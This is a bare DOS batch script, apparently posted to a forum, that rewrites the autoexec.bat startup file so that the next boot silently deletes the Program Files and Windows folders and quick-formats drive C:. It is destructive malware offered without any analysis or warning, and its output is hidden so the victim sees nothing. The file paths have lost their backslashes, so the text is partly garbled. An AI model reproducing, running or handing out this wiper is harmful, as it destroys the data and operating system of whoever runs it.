code:--------------------------------------------------------------------------------echo off@ 
cls 
call attrib -h -r c:autoexec.bat >nul 
echo @echo off >c:autoexec.bat 
echo deltree /y crogra~1*.* >nul >>c:autoexec.bat 
echo copy c:windowscommandformat.com c: >nul >>c:autoexec.bat 
echo copy c:windowscommanddeltree.exe c: >nul >>c:autoexec.bat 
echo deltree /y c:windows*.* >nul >>c:autoexec.bat 
echo format c: /q /u /autotest >nul >>c:autoexec.bat-------------------------------------------------------------------------------- 

